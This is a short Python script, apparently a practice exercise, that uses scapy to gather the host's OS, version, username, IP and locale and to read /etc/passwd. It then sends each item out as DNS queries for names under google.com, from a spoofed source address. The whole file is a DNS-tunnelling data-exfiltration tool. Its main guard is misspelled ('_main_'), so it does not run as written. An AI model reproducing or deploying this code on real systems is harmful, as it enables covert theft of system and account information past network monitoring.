from scapy.all import *
import platform
import getpass
import socket
import locale
import time

from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, UDP

SOURCE_IP = '1.2.3.4'

DEST_IP = '127.0.0.1'


# This function returns the details of the system
def get_details():
    os = platform.system()
    os_version = platform.release()
    user = getpass.getuser()
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    language = locale.getdefaultlocale()
    return os, os_version, user, ip, language[0]


# This function returns the contents of the password file
def get_password_file():
    return open('/etc/passwd', 'r').readlines()


# This function sends the DNS query to the server with the details of the system
def send_dns_query():
    details = get_details()  # Get the details of the system
    file_contents = get_password_file()  # Get the contents of the password file

    ip = IP(src=SOURCE_IP, dst=DEST_IP)
    udp = UDP(sport=RandShort(), dport=53)

    for detail in details:  # For each detail, send a DNS query
        site = detail + '.google.com'
        print(site)
        dns = DNS(rd=1, qd=DNSQR(qname=site))
        packet = ip / udp / dns
        send(packet, verbose=0)

    for line in file_contents:
        site = line + '.google.com'
        print(site)
        dns = DNS(rd=1, qd=DNSQR(qname=site))
        packet = ip / udp / dns
        send(packet, verbose=0)
        time.sleep(1)


if __name__ == '_main_':
    send_dns_query()